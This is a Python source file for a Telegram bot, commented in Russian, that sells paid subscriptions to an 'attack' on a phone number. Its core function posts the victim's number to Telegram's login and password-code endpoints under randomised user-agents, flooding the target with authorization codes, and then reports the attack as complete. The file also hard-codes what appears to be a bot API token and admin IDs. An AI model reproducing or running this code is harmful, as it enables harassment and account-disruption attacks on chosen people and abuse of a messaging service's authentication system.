import asyncio
import json
import requests
import fake_useragent
import pyfiglet
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import LabeledPrice, PreCheckoutQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command
from termcolor import colored

# --- НАСТРОЙКИ ---
API_TOKEN = '8328457578:AAG9r4LzFM2w729U60061ijje5ZBrdf89Go'
CHANNEL_ID = -1003751294791 # ID канала для проверки
ADMINS = [8146320391]   # Твой ID
DB_FILE = 'database.json'

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
ua = fake_useragent.UserAgent()

# --- ЛОГИКА БАЗЫ (Храним подписки) ---
def get_db():
    try:
        with open(DB_FILE, 'r') as f: return json.load(f)
    except: return {}

def save_db(db):
    with open(DB_FILE, 'w') as f: json.dump(db, f, indent=4)

# --- ФУНКЦИЯ "СНОСА" (Твой исходный код) ---
async def start_fck_logic(number, message):
    count = 0
    headers = {'user-agent': ua.random}
    urls = [
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password'
        # ... добавь остальные ссылки из своего списка здесь
    ]
    
    for url in urls:
        try:
            # Используем requests.post (исправлено)
            requests.post(url, headers=headers, data={'phone': number}, timeout=5)
        except:
            pass
    
    await message.answer(f"✅ Атака на {number} завершена!")

# --- ПРОВЕРКИ ---
async def has_access(user_id):
    db = get_db()
    user = db.get(str(user_id), {})
    if not user.get("sub_until"): return False
    return datetime.fromisoformat(user["sub_until"]) > datetime.now()

# --- КОМАНДЫ БОТА ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверка подписки на канал
    check = await bot.get_chat_member(CHANNEL_ID, message.from_user.id)
    if check.status not in ['member', 'administrator', 'creator']:
        return await message.answer("❌ Подпишись на канал для доступа!")

    await message.answer(pyfiglet.figlet_format("FUCK TG"))
    await message.answer("Введите номер для запуска или /buy для покупки подписки.")

@dp.message(Command("buy"))
async def buy_stars(message: types.Message):
    await message.answer_invoice(
        title="Доступ к софту",
        description="Подписка на 30 дней",
        prices=[LabeledPrice(label="XTR", amount=250)],
        provider_token="", # Для Stars пусто
        payload="sub_premium",
        currency="XTR"
    )

@dp.pre_checkout_query()
async def pre_checkout(query: PreCheckoutQuery):
    await query.answer(ok=True)

@dp.successful_payment()
async def success_pay(message: types.Message):
    db = get_db()
    uid = str(message.from_user.id)
    new_date = datetime.now() + timedelta(days=30)
    db[uid] = {"sub_until": new_date.isoformat()}
    save_db(db)
    await message.answer(f"🔥 Доступ открыт до {new_date.strftime('%d.%m.%Y')}")

# --- ЗАПУСК СКРИПТА ПО НОМЕРУ ---
@dp.message(F.text.regexp(r'^\+?\d{10,15}$')) # Если юзер прислал номер
async def handle_number(message: types.Message):
    if not await has_access(message.from_user.id):
        return await message.answer("⛔ У тебя нет активной подписки! Жми /buy")
    
    number = message.text
    await message.answer(f"🚀 Запускаю работу по номеру {number}...")
    await start_fck_logic(number, message)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
